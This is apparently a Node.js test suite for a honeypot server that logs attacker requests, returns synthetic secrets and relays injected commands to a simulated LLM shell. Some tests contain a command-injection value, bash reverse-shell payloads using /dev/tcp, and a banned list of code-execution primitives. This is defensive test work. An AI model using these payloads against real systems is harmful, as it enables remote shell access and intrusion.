import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import { readdirSync, readFileSync } from 'node:fs';
import { createTrap } from '../apps/trap/server.mjs';

const SID = '00000000-0000-4000-8000-000000000001';
const ADMIN_TOKEN = 'synthetic_token_not_valid_anywhere';

let control, trap, base;
let received = [];
let shellOpens = [];
let oneshotCalls = [];
let eventsStatus = 200;

const listen = (srv) => new Promise((r) => srv.listen(0, '127.0.0.1', () => r(srv.address().port)));

before(async () => {
  control = http.createServer((req, res) => {
    let b = '';
    req.on('data', (c) => (b += c));
    req.on('end', () => {
      if (req.headers.authorization !== 'Bearer tok') { res.writeHead(401); return res.end(); }
      const body = b ? JSON.parse(b) : {};
      if (req.url === '/v1/events/batch') {
        if (eventsStatus === 200) received.push(...body.events);
        res.writeHead(eventsStatus); return res.end('{}');
      }
      if (req.url === '/v1/shell/oneshot') {
        oneshotCalls.push(body);
        res.writeHead(200); return res.end(JSON.stringify({ output: 'uid=1000(node) gid=1000(node)\n' }));
      }
      if (req.url === '/v1/shell/open') {
        shellOpens.push(body);
        res.writeHead(200); return res.end(JSON.stringify({ banner: 'bash: no job control in this shell\n', prompt: 'node@acme-status-7f9c4:/app$ ' }));
      }
      if (req.url === '/v1/shell/cmd') {
        res.writeHead(200); return res.end(JSON.stringify({ output: 'ok\n', prompt: 'node@acme-status-7f9c4:/app$ ', served_by: 'llm', delay_ms: 0, close: false }));
      }
      res.writeHead(404); res.end();
    });
  });
  const cp = await listen(control);
  trap = createTrap({
    DEMO_MODE: 'true', TRAP_INSTANCE_ID: 'test', INGEST_TOKEN: 'tok',
    CONTROL_URL: `http://127.0.0.1:${cp}`, BODY_LIMIT_BYTES: '1024',
    CALLBACK_ALLOWLIST: '127.0.0.1', REVSHELL_HOLD_MS: '40'
  });
  base = `http://127.0.0.1:${await listen(trap)}`;
});
after(() => { trap.close(); control.close(); });

const post = (p, body, h = {}) => fetch(base + p, { method: 'POST', headers: { 'x-demo-session': SID, ...h }, body });

test('health works without capture', async () => {
  const n = received.length;
  assert.equal((await fetch(base + '/health')).status, 200);
  assert.equal(received.length, n);
});

test('three bait requests give three distinct events', async () => {
  received = [];
  await post('/api/login', '{"user":"a","password":"hunter2"}');
  await fetch(base + '/api/env', { headers: { 'x-demo-session': SID } });
  await post('/api/exec', '{"task":"demo-action"}');
  assert.equal(received.length, 3);
  assert.equal(new Set(received.map((e) => e.event_id)).size, 3);
  assert.ok(received.every((e) => e.session_id === SID && e.origin_label === 'synthetic_fixture'));
});

test('env route returns synthetic values only', async () => {
  process.env.DATABASE_URL = 'postgres://real:real@real/real';
  const t = await (await fetch(base + '/api/env')).text();
  assert.match(t, /db\.invalid/);
  assert.doesNotMatch(t, /real:real/);
  delete process.env.DATABASE_URL;
});

test('exec returns fixed text and does not run input', async () => {
  const r = await post('/api/exec', '{"task":"touch /tmp/honeystack-pwned"}');
  assert.equal(await r.text(), 'task completed');
  const { existsSync } = await import('node:fs');
  assert.equal(existsSync('/tmp/honeystack-pwned'), false);
});

test('passwords are redacted in stored payload', async () => {
  received = [];
  await post('/api/login', '{"user":"a","password":"hunter2"}');
  assert.doesNotMatch(received[0].payload_text, /hunter2/);
});

test('oversized body gets 413 with bounded metadata', async () => {
  received = [];
  const r = await post('/api/exec', 'x'.repeat(5000));
  assert.equal(r.status, 413);
  assert.equal(received[0].payload_bytes, 1024);
  assert.equal(received[0].planned_status, 413);
});

test('ingest failure gives explicit 503, not fake success', async () => {
  eventsStatus = 503;
  const r = await post('/api/exec', '{"task":"demo-action"}');
  eventsStatus = 200;
  assert.equal(r.status, 503);
});

test('unknown path and wrong method get controlled 404', async () => {
  assert.equal((await fetch(base + '/nope')).status, 404);
  assert.equal((await fetch(base + '/api/exec')).status, 404);
});

test('diagnostics without the admin token is 401', async () => {
  received = [];
  const r = await post('/api/admin/diagnostics', '{"host":"db.acme.invalid"}');
  assert.equal(r.status, 401);
  assert.equal(received[0].response_template, 'diag-unauthorized');
});

test('diagnostics with token returns canned ping for a plain host', async () => {
  received = [];
  const r = await post('/api/admin/diagnostics', '{"host":"db.acme.invalid"}', { authorization: `Bearer ${ADMIN_TOKEN}` });
  const t = await r.text();
  assert.match(t, /PING db\.acme\.invalid/);
  assert.match(t, /1 packets transmitted/);
  assert.equal(received[0].response_template, 'diag-ping');
});

test('injected command is relayed to the shell brain, not executed', async () => {
  received = [];
  oneshotCalls = [];
  const r = await post('/api/admin/diagnostics', '{"host":"db.acme.invalid; id"}', { authorization: `Bearer ${ADMIN_TOKEN}` });
  const t = await r.text();
  assert.match(t, /PING db\.acme\.invalid/);      // first part still pings
  assert.match(t, /uid=1000/);                    // extra command came from the brain
  assert.equal(oneshotCalls.length, 1);
  assert.equal(oneshotCalls[0].command, 'id');
  assert.equal(received[0].response_template, 'diag-injected');
});

test('reverse shell to a non-allowlisted IP is blocked, no connection', async () => {
  received = [];
  shellOpens = [];
  const payload = 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1';
  const r = await post('/api/admin/diagnostics', JSON.stringify({ host: payload }), { authorization: `Bearer ${ADMIN_TOKEN}` });
  assert.equal(r.status, 200);
  assert.equal(shellOpens.length, 0);
  assert.ok(received.some((e) => e.response_template === 'revshell-blocked'));
});

test('reverse shell to an allowlisted IP connects and relays the banner', async () => {
  shellOpens = [];
  const banner = await new Promise((resolve) => {
    const lsnr = net.createServer((sock) => {
      let d = '';
      sock.on('data', (c) => { d += c; if (d.includes('$')) { resolve(d); sock.end(); lsnr.close(); } });
    });
    lsnr.listen(0, '127.0.0.1', () => {
      const lport = lsnr.address().port;
      post('/api/admin/diagnostics',
        JSON.stringify({ host: `bash -i >& /dev/tcp/127.0.0.1/${lport} 0>&1` }),
        { authorization: `Bearer ${ADMIN_TOKEN}` });
    });
  });
  assert.match(banner, /bash: no job control/);
  assert.equal(shellOpens.length, 1);
  assert.equal(shellOpens[0].callback_ip, '127.0.0.1');
});

test('no code-execution primitives in apps/trap source', () => {
  const dir = new URL('../apps/trap/', import.meta.url);
  const files = readdirSync(dir).filter((f) => f.endsWith('.mjs'));
  assert.ok(files.length >= 2, 'expected server.mjs and shell-connector.mjs');
  const banned = [/\bchild_process\b/, /\beval\s*\(/, /\bnew\s+Function\s*\(/, /\bnode:vm\b/, /require\(\s*['"]vm['"]\s*\)/];
  for (const f of files) {
    const src = readFileSync(new URL(f, dir), 'utf8');
    for (const re of banned) {
      assert.ok(!re.test(src), `${f} must not contain ${re}`);
    }
  }
});
